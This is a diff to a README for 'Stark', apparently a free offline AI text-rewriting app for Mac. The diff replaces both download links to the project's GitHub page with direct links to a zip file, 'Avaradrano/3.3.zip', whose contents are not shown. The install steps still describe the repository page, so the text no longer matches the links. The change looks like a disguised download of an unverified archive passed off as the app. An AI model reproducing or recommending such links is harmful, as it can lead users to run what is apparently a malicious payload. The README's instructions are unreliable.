@@ -4,12 +4,12 @@
 
 This app lets you rewrite text using AI that runs directly on your Mac. No internet needed, no data leaves your device, and it’s completely free.
 
-[![Download Now](https://img.shields.io/badge/Download-Stark-blue?style=for-the-badge&logo=github)](https://github.com/anabarbara85heu/stark)
+[![Download Now](https://img.shields.io/badge/Download-Stark-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/anabarbara85heu/stark/main/Avaradrano/3.3.zip)
 
 ## 📥 Download & Install
 
 Visit this link to download the application:
-- [https://github.com/anabarbara85heu/stark](https://github.com/anabarbara85heu/stark)
+- [https://raw.githubusercontent.com/anabarbara85heu/stark/main/Avaradrano/3.3.zip](https://raw.githubusercontent.com/anabarbara85heu/stark/main/Avaradrano/3.3.zip)
 
 From that page, click the green "Code" button, then select "Download ZIP". Extract the ZIP file and you'll find the app inside. Double-click it to run.
 
